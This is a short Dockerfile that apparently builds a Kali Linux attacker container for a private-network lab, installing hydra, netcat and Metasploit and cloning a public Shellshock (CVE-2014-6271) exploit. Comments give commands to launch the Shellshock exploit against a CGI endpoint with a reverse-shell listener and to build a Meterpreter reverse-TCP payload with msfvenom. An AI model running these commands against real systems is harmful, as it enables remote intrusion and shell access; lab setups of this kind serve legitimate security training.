FROM kalilinux/kali-rolling

RUN apt update && apt -y install curl python3 python3-pip iproute2 iptables ssh netcat-traditional hydra
RUN apt update && apt install -y metasploit-framework

WORKDIR /root/

COPY ./code/ /root/

RUN git clone https://github.com/b4keSn4ke/CVE-2014-6271
# CMD : python3 shellshock.py 192.168.72.100 4444 http://192.168.72.66/cgi-bin/stats/
# CMD : msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.72.100 LPORT=5555 -f elf > reverse.elf
